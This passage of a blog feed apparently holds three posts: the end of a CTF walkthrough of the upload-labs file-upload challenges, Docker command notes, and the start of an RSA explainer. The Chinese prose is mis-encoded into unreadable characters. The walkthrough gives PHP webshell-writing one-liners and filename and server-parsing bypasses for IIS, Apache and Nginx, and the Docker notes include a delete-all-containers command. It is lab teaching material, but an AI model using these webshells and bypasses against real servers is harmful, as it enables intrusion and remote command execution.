class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcLdg.png" alt="kJcLdg.png"></p><p>è·Ÿpass-13ä¸€æ ·çš„ç»•è¿‡æ–¹æ³•</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>è¿™ä¸€å…³å¯¹åç¼€åå’Œæ–‡ä»¶ç±»å‹å•¥çš„éƒ½è¿›è¡Œäº†å¾ˆä¸¥æ ¼çš„æ§åˆ¶ï¼Œè€Œä¸”åœ¨åé¢è¿˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡ç¼–è¯‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">$im = imagecreatefromjpeg($target_path);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸ªé¢˜ç›®è·Ÿä¸Šæ¬¡æ ¡èµ›çš„é¢˜ç›®æ€è·¯ä¸€è‡´ï¼Œå¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ï¼Œä¸‹è½½ä¸‹æ¥åå‘ç°è¿™ä¸€éƒ¨åˆ†æ’å…¥ä»£ç çš„æ²¡å˜ä½†æ˜¯å…¶ä»–éƒ¨åˆ†éƒ½å˜äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgrkQ.png" alt="kJgrkQ.png"></p><p>å°è¯•æ–‡ä»¶åŒ…å«ï¼Œåé¢æ€ä¹ˆåˆ©ç”¨å°±ä¸å¤šè¯´äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgq6x.png" alt="kJgq6x.png"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>è¿™ä¸€å…³æ˜¯æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼ŒæŸ¥çœ‹æºä»£ç å°±ä¼šå‘ç°ä½ éœ€è¦åœ¨ç¼“å­˜æ–‡ä»¶è½¬ç§»åˆ°åˆ«çš„ç›®å½•çš„æ—¶å€™ï¼Œèµ¶ç´§è®¿é—®å®ƒï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨burpå»å‘åŒ…ï¼Œå¯ä»¥æŠŠæ–‡ä»¶å†…å®¹æ”¹æˆä¸‹é¢è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…è¿™æ ·ï¼Œåæ­£å°±æ˜¯ä¸ºäº†å†™æ–‡ä»¶è¿›å»å°±å¯¹äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ2d3R.png" alt="kJ2d3R.png"></p><p>ä¸¤ä¸ªburpè·‘ä¸€è·‘ï¼Œå°±ä¼šåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹é¢äº§ç”Ÿæ–°çš„æ–‡ä»¶äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2Du6.png" alt="kJ2Du6.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2W8A.png" alt="kJ2W8A.png"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>åŒæ ·çš„ä¹Ÿæ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹æºä»£ç å¯ä»¥å‘ç°è¿™é‡Œä½¿ç”¨ç±»å»å®ç°ç›¸å…³æ–¹æ³•ï¼ŒåŒ…æ‹¬æŸ¥çœ‹æ–‡ä»¶åç¼€åï¼Œå¤§å°ç­‰ç­‰</p><p>è¿™é‡Œé¢çš„é—®é¢˜å­˜åœ¨äºä»£ç å°†ä¸Šä¼ æ–‡ä»¶æ›´æ”¹åå­—çš„æ—¶å€™ç»™äº†ä¸ªæ—¶é—´å·®ï¼Œè®©æˆ‘ä»¬å¯ä»¥å»å®ç°è¿™ä¸ªç«äº‰æ•ˆæœï¼ŒåŒæ ·çš„æ–¹æ³•ï¼Œä¸éƒ½è¯´</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>è¿™ä¸€å…³æ­£å¸¸åšæ³•åº”è¯¥æ˜¯CVE-2015-2348 move_uploaded_file() 00æˆªæ–­ï¼Œä¸Šä¼ webshellï¼ŒåŒæ—¶è‡ªå®šä¹‰ä¿å­˜åç§°</p><p>ä¸Šä¼ çš„æ–‡ä»¶åç”¨0x00ç»•è¿‡ã€‚æ”¹æˆ<code>xx.phpã€äºŒè¿›åˆ¶00ã€‘.x.jpg</code></p><p>ä½†æ˜¯å‘ç°äº†ä¸€ç§æ›´æœ‰æ„æ€çš„è§£æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯<code>move_uploaded_file</code>åº•å±‚ä¼šè°ƒç”¨<code>tsrm_realpath</code>å‡½æ•°å¯¼è‡´ï¼Œé€’å½’åˆ é™¤æ–‡ä»¶åæœ€åçš„<code>/.</code>å¯¼è‡´ç»•è¿‡äº†åç¼€åæ£€æµ‹ï¼ŒåŒæ ·ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰<code>file_put_content()</code>ï¼Œåæ­£æ‰“å¼€æ–‡ä»¶æµéƒ½ä¼šæœ‰ç±»ä¼¼çš„æ“ä½œ</p><p>æ‰€ä»¥å¯ä»¥è¿™æ ·å­å»ç»•è¿‡<code>6.php/.</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kJTg56.png" alt="kJTg56.png"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>è¿™ä¸ªé¢˜ç›®ç”¨äº†æ•°ç»„+/.çš„æ–¹å¼å»ç»•è¿‡ï¼Œå› ä¸ºæºä»£ç é‡Œé¢å«æœ‰è¿™æ ·çš„ä¸¤å¥ä»£ç ï¼Œæˆäº†å…³é”®å¾—ç»•è¿‡çš„åœ°æ–¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>è¿™åŒæ ·æˆ‘ä»¬å°±éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆå¾—ä¿è¯å¦å¤–ä¿®æ”¹çš„åå­—éœ€è¦æ»¡è¶³æ˜¯æ•°ç»„çš„æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠ“åŒ…æ„é€ æ•°ç»„ï¼Œç¬¬äºŒç‚¹ç”±äºåé¢filenameæ„æˆçš„è¿‡ç¨‹ä¸­ç”±äº<code>$file[count($file) - 1]</code>çš„ä½œç”¨ï¼Œå¯¼è‡´<code>$file[1] = NULL</code>ï¼Œæ‰€ä»¥æ„é€ æ–‡ä»¶ååç›¸å½“äºç›´æ¥å°±æ˜¯<code>xx.php/.</code>ï¼Œæ ¹æ®ä¸Šé¢ä¸€é¢˜çš„çŸ¥è¯†ï¼Œå¯ä»¥ç›´æ¥åœ¨<code>move_uploaded_file</code>å‡½æ•°çš„ä½œç”¨ä¸‹å¯ä»¥å°†<code>/.</code>å¿½ç•¥ï¼Œå› æ­¤è¿˜æ˜¯å¯ä»¥ä¸Šä¼ æˆåŠŸçš„ã€‚</p><p>å› æ­¤save_nameå˜é‡çš„ä¸¤ä¸ªå€¼åˆ†åˆ«æ˜¯<code>xx.php/</code>ï¼Œå¦å¤–ä¸€ä¸ªå€¼æ˜¯<code>jpg</code>ï¼Œå…¶å®ä»ä»£ç å®¡è®¡çš„è§’åº¦ä¸Šçœ‹ï¼Œè¿˜æ˜¯å¯æ§å˜é‡å¯¼è‡´è¿™æ ·çš„åæœ</p><p><img src="https://s2.ax1x.com/2019/02/13/k0OSM9.png" alt="k0OSM9.png"></p><p><img src="https://s2.ax1x.com/2019/02/13/k0O9q1.png" alt="k0O9q1.png"></p><h3 id="å°ç»“ä¸€ä¸‹"><a href="#å°ç»“ä¸€ä¸‹" class="headerlink" title="å°ç»“ä¸€ä¸‹"></a>å°ç»“ä¸€ä¸‹</h3><p>upload-labsé‡Œé¢çš„å…³å¡ä¸ªäººæ„Ÿè§‰åªæ˜¯é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªæ¼æ´å»å¼„çš„ï¼Œå¯ä»¥æ¢³ç†ä¸€ä¸‹ï¼Œå¯ä»¥æ ¹æ®ä¸Šé¢çš„ç»•è¿‡å†™ä¸€ä¸ªfuzzå­—å…¸XD</p><ol><li>å‰ç«¯çš„ç»•è¿‡</li><li>åç¼€åï¼Œæ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶å¤´çš„ç»•è¿‡</li><li>Windowsä¸‹::$DATAçš„é—®é¢˜</li><li>å›¾ç‰‡ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡</li><li>æ ¹æ®ä»£ç è·³è¿›è¿›è¡Œçš„ç»•è¿‡</li><li>æ¡ä»¶ç«äº‰</li></ol><p>è¿˜æœ‰å…¶ä»–çš„ä¸­é—´ä»¶é—®é¢˜å¯¼è‡´çš„è§£ææ¼æ´æ²¡æœ‰å±•ç°å‡ºæ¥ï¼Œå¯èƒ½ç¯å¢ƒé…ç½®æ¯”è¾ƒéº»çƒ¦ï¼Œæƒ³äº†å¾ˆä¹…ï¼Œæˆ‘æ€•è‡ªå·±å¿˜äº†ï¼Œè¿˜æ˜¯è‡ªå·±æ€»ç»“ä¸€ä¸‹ï¼Œä»¥åå¯ä»¥æ‹¿å‡ºæ¥çœ‹ä¸€ä¸‹</p><h4 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h4><p><code>IIS 6.0</code>è§£æåˆ©ç”¨æ–¹æ³•æœ‰ä¸‰ç§ï¼š<br>1.ç›®å½•è§£æ<br>å»ºç«‹xx.aspä¸ºåç§°çš„<code>æ–‡ä»¶å¤¹</code>ï¼Œå°†aspæ–‡ä»¶æ”¾å…¥ï¼Œè®¿é—®/xx.asp/xx.jpgï¼Œå…¶ä¸­xx.jpgå¯ä»¥ä¸ºä»»æ„æ–‡ä»¶åç¼€ï¼Œå³å¯è§£æ<br>2.æ–‡ä»¶è§£æ<br>åç¼€è§£æï¼š/xx.asp;.jpg    /xx.asp:.jpg(æ­¤å¤„éœ€æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶å)<br>3.é»˜è®¤è§£æ<br>IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h4><p>åœ¨æ­£å¸¸å›¾ç‰‡URLåæ·»åŠ  /.phpï¼Œå¯ä»¥è§£æä¸ºphp</p><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>ä¸€èˆ¬éƒ½åœ¨2.3.xä»¥ä¸‹ç‰ˆæœ¬ï¼Œä½†æ˜¯æœ‰æ—¶å€™é…ç½®æ–‡ä»¶çš„ä¸åŒä¹Ÿä¼šå¯¼è‡´ä¸å®‰å…¨</p><p>åç¼€è§£æï¼štest.php.x1.x2.x3<br>Apacheå°†ä»å³è‡³å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œè‹¥x3éå¯è¯†åˆ«åç¼€ï¼Œå†åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå°†è¯¥å¯è¯†åˆ«åç¼€è¿›è§£æ<br>test.php.x1.x2.x3åˆ™ä¼šè¢«è§£æä¸ºphp</p><p>æœ€è¿‘åœ¨å‡ºé¢˜çš„æ—¶å€™åœ¨apache 2.1.xçš„ç‰ˆæœ¬å°±å¯ä»¥ç”¨test.php.jpgç›´æ¥å°±å¯ä»¥getshelläº†ï¼ŒçœŸå°´å°¬ã€‚</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>Nginx &lt;<code>8.03</code>ç•¸å½¢è§£ææ¼æ´<br>ç›´æ¥åœ¨æ­£å¸¸å›¾ç‰‡URLåæ·»åŠ <code>/.php</code><br>Nginx &lt;=<code>0.8.37</code><br>åœ¨Fast-CGI<code>å…³é—­</code>çš„æƒ…å†µä¸‹ï¼ŒNginx &lt;=0.8.37 ä¾ç„¶å­˜åœ¨è§£ææ¼æ´</p><p>åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š%00.phpä¼šå°† /xx.jpg%00.php è§£æä¸º php æ–‡ä»¶ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;é—²æ¥æ— èŠï¼ŒæŠŠupload-labsæ‰€æœ‰çš„å…³å¡éƒ½åˆ·ä¸€é
    
    </summary>
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="0verwatch.top/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="0verwatch.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Dockerfileç¼–å†™</title>
    <link href="0verwatch.top/Dockerfile-writing.html"/>
    <id>0verwatch.top/Dockerfile-writing.html</id>
    <published>2019-01-22T06:47:05.000Z</published>
    <updated>2019-02-08T10:15:33.598Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å‡ºé¢˜ç›®ï¼ŒDockerfileæœ‰äº›ä¸œè¥¿å¿˜è®°äº†<a id="more"></a>ï¼Œé‡æ–°å›é¡¾ä¸€ä¸‹</p><h4 id="å®¹å™¨å‘½ä»¤"><a href="#å®¹å™¨å‘½ä»¤" class="headerlink" title="å®¹å™¨å‘½ä»¤"></a>å®¹å™¨å‘½ä»¤</h4><p>æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼šdocker run [opotions] IMAGE [COMMAND] [Args..]</p><p>-i : äº¤äº’å¼è¿è¡Œå¹¶ä¸”ä¸-tç›¸äº’è¿è¡Œ</p><p>-t ï¼šæ–°å»ºä¸€ä¸ªç»ˆç«¯</p><p>â€“nameï¼šç›´æ¥è·Ÿæ–°å»ºçš„åå­—</p><p>docker ps:æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ -aæŸ¥çœ‹å†å²è¿è¡Œè¿‡çš„å®¹å™¨ -l ä¸Šæ¬¡è¿è¡Œçš„ -n åŠ ä¸ªæ•°å­—æ˜¾ç¤ºæœ€è¿‘å‡ æ¬¡åˆ›å»ºçš„å®¹å™¨ -q æ˜¾ç¤ºå®¹å™¨ç¼–å·  å¯ä»¥ä»¥æ­¤åˆ é™¤å®¹å™¨</p><p>é€€å‡ºå®¹å™¨ï¼šä¸¤ç§ï¼š1. exit  å®¹å™¨åœæ­¢é€€å‡º 2. ctrl+P+Q  å®¹å™¨ä¸åœæ­¢å¹¶é€€å‡º</p><p>å¯åŠ¨å®¹å™¨ï¼šdocker start å®¹å™¨ID</p><p>é‡å¯å®¹å™¨ï¼š docker restart å®¹å™¨ID</p><p>åœæ­¢å®¹å™¨ï¼š docker stop å®¹å™¨IDæˆ–åå­—</p><p>å¼ºåˆ¶åœæ­¢å®¹å™¨ï¼šdocker kill å®¹å™¨IDæˆ–åå­—</p><p>åˆ é™¤å·²ç»åœæ­¢çš„å®¹å™¨ï¼šdocker rm å®¹å™¨IDæˆ–åå­— æ²¡æœ‰åœæ­¢çš„åŠ ä¸ª -f</p><p>åˆ é™¤å…¨éƒ¨ docker rm -f  $(docker ps -aq)</p><p>-Pï¼šéšæœºç«¯å£æ˜ å°„</p><p>-pï¼šæŒ‡å®šç«¯å£æ˜ å°„ï¼Œæœ‰ä»¥ä¸‹å››ç§æ ¼å¼</p><p>ip:hostPort:containerPort</p><p>ip:containerPort</p><p>hostPort:containerPort</p><p>contarinerPort</p><p>å¯åŠ¨å®ˆæŠ¤å®¹å™¨ï¼š -d åå°è¿è¡Œå¹¶è¿”å›ID</p><p>ä½†æ˜¯ç”¨è¿™ç§æ–¹æ¡ˆå¯åŠ¨çš„dockerä½¿ç”¨pså‘½ä»¤æ˜¯çœ‹ä¸åˆ°å…¶å®¹å™¨è¿›ç¨‹ï¼Œå› ä¸ºä»–å·²ç»é€€å‡ºäº†ï¼ŒDockeråå°è¿è¡Œå°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œå¦‚æœä¸æ˜¯é‚£äº›ä¸€ç›´æŒ‚æ°”çš„å‘½ä»¤å¦‚(top,tail)ï¼Œå°±æ˜¯ä¼šè‡ªåŠ¨å¯åŠ¨çš„</p><p>æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker logs -f -t â€“tail å®¹å™¨ID -tæ—¶é—´æˆ³ -fè·Ÿéšæœ€æ–°æ—¥å¿—æ‰“å° â€“tailè·Ÿæ•°å­—è¡¨ç¤ºæœ€åå‡ æ¡</p><p>æŸ¥çœ‹å®¹å™¨å†…è¿›ç¨‹ï¼šdocker top å®¹å™¨åå­—ã€ID</p><p>æŸ¥çœ‹å®¹å™¨å†…éƒ¨çš„ç»†èŠ‚ï¼šdocker inspect å®¹å™¨ID</p><p>è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š docker exec -it å®¹å™¨ID /bin/bashï¼ˆå¥½åƒä¸€å®šè¦å†™ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œä¸å†™è¿›ä¸å»ï¼Œå†™ä¸å†™éƒ½å¯ä»¥ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å‘½ä»¤ï¼Œåˆ™è¾“å‡ºå‘½ä»¤æ˜¾ç¤ºçš„ç»“æœï¼‰ </p><p>æˆ–è€…æ˜¯docker attach å®¹å™¨IDï¼Œå¯¹æ¯”ä¸€ä¸‹å¯ä»¥çŸ¥é“execåŠŸèƒ½æ›´å¤š</p><p>ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Šï¼šdocker cp å®¹å™¨ID:å®¹å™¨é‡Œé¢çš„è·¯å¾„ ä¸»æœºæœ¬åœ°è·¯å¾„(å¯ä»¥æ”¹ä¸€ä¸‹åå­—)</p><h4 id="Dockeré•œåƒ"><a href="#Dockeré•œåƒ" class="headerlink" title="Dockeré•œåƒ"></a>Dockeré•œåƒ</h4><p>æ˜¯ä»€ä¹ˆï¼Ÿè”åˆæ–‡ä»¶ç³»ç»Ÿ   æœ€å¤§å¥½å¤„ ï¼Ÿå…±äº«èµ„æº</p><p>æ­£å¸¸çš„å‘½ä»¤å°±ä¸è¯´äº†ï¼Œçœ‹æ–‡æ¡£å°±å¯ä»¥ã€‚</p><p>docker commit æäº¤å®¹å™¨å‰¯æœ¬ä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ–°çš„é•œåƒ</p><p>docker commit -m æäº¤æè¿°çš„ä¿¡æ¯ -a ä½œè€… å®¹å™¨ID  è¦åˆ›å»ºçš„ç›®æ ‡é•œåƒåï¼š[æ ‡ç­¾å]</p><p>è¯´æ˜å¯åç€æ¥</p><h5 id="å®¹å™¨æ•°æ®å·"><a href="#å®¹å™¨æ•°æ®å·" class="headerlink" title="å®¹å™¨æ•°æ®å·"></a>å®¹å™¨æ•°æ®å·</h5><p>ç›´æ¥å‘½ä»¤æ·»åŠ  ï¼šdocker run -it -v  /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½• é•œåƒå</p><p>å®¹å™¨å’Œå®¿ä¸»æœºä¹‹é—´æ•°æ®å…±äº«</p><p>å¸¦æƒé™çš„docker run -it -v  /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½•:ro é•œåƒå</p><p>Dockerfileæ·»åŠ </p><p>å¯åœ¨Dockerfileä¸­ä½¿ç”¨VOLUMNæŒ‡ä»¤æ¥ç»™é•œåƒæ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å·</p><p>æ–°å»ºä¸€ä¸ªDockerfileç„¶åé€šè¿‡buildè¿è¡Œæ–°å»ºé•œåƒ</p><p>docker build -f  æ–‡ä»¶è·¯å¾„ -t  è‡ªå·±çš„åå­—ç©ºé—´/centos  .</p><p>è¦æ‰¾é»˜è®¤åœ°å€ç”¨inspectå‘½ä»¤æŸ¥çœ‹</p><p>å®¹å™¨æ•°æ®å…±äº« â€“volumns-from å„è‡ªæ·»åŠ éƒ½èƒ½å…±äº«ï¼Œè€Œä¸”æ³¨æ„ä¸€ä¸‹è¿™ç‚¹ï¼Œæ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢</p><h4 id="Dockerfileè§£æ"><a href="#Dockerfileè§£æ" class="headerlink" title="Dockerfileè§£æ"></a>Dockerfileè§£æ</h4><p>æ¯æ¡ä¿ç•™å­—æŒ‡ä»¤å¹¶ä¸”åé¢è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸”æ˜¯ä»ä¸Šå¾€ä¸‹é¡ºåºæ‰§è¡Œï¼Œ#è¡¨ç¤ºæ³¨é‡Š</p><p>æ¯æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºæ–°çš„é•œåƒå±‚ï¼Œå¹¶å¯¹é•œåƒè¿›è¡Œæäº¤</p><p>ä¿ç•™å­—æŒ‡ä»¤</p><p>FROM åŸºç¡€é•œåƒ </p><p>MAINTAINER é•œåƒç»´æŠ¤è€…çš„å§“åå’Œé‚®ç®±</p><p>RUN å®¹å™¨æ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤</p><p>EXPOSE å½“å‰å®¹å™¨å¯¹å¤–æš´éœ²çš„ç«¯å£å·</p><p>WORKDIR æŒ‡å®šåˆ›å»ºå®¹å™¨åï¼Œç»ˆç«¯é»˜è®¤ç™»å½•è¿›æ¥çš„å·¥ä½œç›®å½•ï¼Œä¸€ä¸ªè½è„šç‚¹</p><p>ENV ç”¨æ¥åœ¨æ„å»ºé•œåƒè¿‡ç¨‹ä¸­è®¾ç½®ç¯å¢ƒå˜é‡</p><p>ADD å°†å®¿ä¸»æœºç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›äº¬å‘ä¸”ADDå‘½ä»¤ä¼šè‡ªåŠ¨å¤„ç†URLå’Œè§£å‹taråŒ…</p><p>COPY ç±»ä¼¼ADDæ‹·è´æ–‡ä»¶å’Œç›®å½•åˆ°é•œåƒä¸­1.COPY src dest 2.COPY [â€œsrcâ€,â€destâ€]</p><p>VOLUME å®¹å™¨æ•°æ®å·ï¼Œç”¨äºä¿å­˜æ•°æ®</p><p>CMD å¯ä»¥æœ‰å¤šä¸ªå‘½ä»¤ï¼Œä½†ä¼šè¢«docker runä¹‹åæ›¿æ¢æœ€åä¸€ä¸ªå‘½ä»¤ï¼Œè€Œä¸”ä¸èƒ½è¿½åŠ æŸä¸ªå‘½ä»¤çš„é€‰é¡¹</p><p>ENTRYPOINT è·ŸCMDç±»ä¼¼ï¼Œä½†æ˜¯å¯ä»¥è¿½åŠ ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åœ¨å‡ºé¢˜ç›®ï¼ŒDockerfileæœ‰äº›ä¸œè¥¿å¿˜è®°äº†
    
    </summary>
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>RSAåŸç†åŠPythonå®ç°</title>
    <link href="0verwatch.top/RSA-python.html"/>
    <id>0verwatch.top/RSA-python.html</id>
    <published>2019-01-12T08:46:30.000Z</published>
    <updated>2019-01-12T08:47:31.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>RSAæ˜¯ç¬¬ä¸€ä¸ªå®‰å…¨ï¼Œå®ç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå·²æˆä¸ºå›½å®¶æ ‡å‡†ï¼Œæ˜¯ç›®å‰åº”ç”¨å¹¿æ³›çš„å…¬é’¥åŠ å¯†ä½“åˆ¶ï¼ŒRSAçš„åŸºç¡€æ˜¯æ•°è®ºçš„æ¬§æ‹‰å®šç†<a id="more"></a>ï¼Œå®ƒçš„å®‰å…¨æ€§ä¾èµ–äºå¤§æ•´æ•°å› å­åˆ†è§£çš„å›°éš¾æ€§ï¼Œå› ä¸ºåŠ è§£å¯†æ¬¡åºå¯æ¢ï¼Œå¯ç”¨äºåŠ è§£å¯†ï¼Œå¯ç”¨äºè®¾è®¡æ•°å­—ç­¾åä½“åˆ¶ã€‚</p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>é€‰å–ä¸¤ä¸ªå®‰å…¨çš„å¤§ç´ æ•°på’Œq(å…¶é•¿åº¦è¦è¶³å¤Ÿé•¿è‡³å°‘è¦æ˜¯1024ä½)</li><li>è®¡ç®—ä¹˜ç§¯n = p <em> q, è®¡ç®—phi(n) = (p-1)</em>(q-1)ï¼Œå…¶ä¸­phi(n)ä¸ºnçš„æ¬§æ‹‰å‡½æ•°</li><li>éšæœºé€‰å–æ•´æ•°eï¼Œä½œä¸ºå…¬é’¥ï¼Œè¦æ±‚æ»¡è¶³gcd(e, phi(n)) =1 ,å³eä¸phi(n)äº’ç´ </li><li>ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—ç§é’¥dã€‚æ»¡è¶³d * e=1(mod phi(n))ï¼Œeå’Œnæ˜¯å…¬é’¥ï¼Œdæ˜¯ç§˜é’¥ã€‚ </li></ol><p>æˆ‘çš„ä»£ç æ˜¯å›ºå®šäº†å…¬é’¥ä¸º65537ï¼Œäº§ç”Ÿçš„ä¸¤ä¸ªå¤§ç´ æ•°æ˜¯é€šè¿‡Miller-Rabinç®—æ³•è¿›è¡Œå¡‘ç´ æ€§æ£€æµ‹å¹¶ä¸”äº§ç”Ÿç´ æ•°pè¿˜æœ‰qã€‚</p><h3 id="æ ¸å¿ƒä»£ç åŠåˆ†æ"><a href="#æ ¸å¿ƒä»£ç åŠåˆ†æ" class="headerlink" title="æ ¸å¿ƒä»£ç åŠåˆ†æ"></a>æ ¸å¿ƒä»£ç åŠåˆ†æ</h3><p>é¦–å…ˆæ˜¯å…ˆäº§ç”Ÿä¸¤ä¸ªå¤§ç´ æ•°på’Œqï¼Œè¿™é‡Œçš„æ 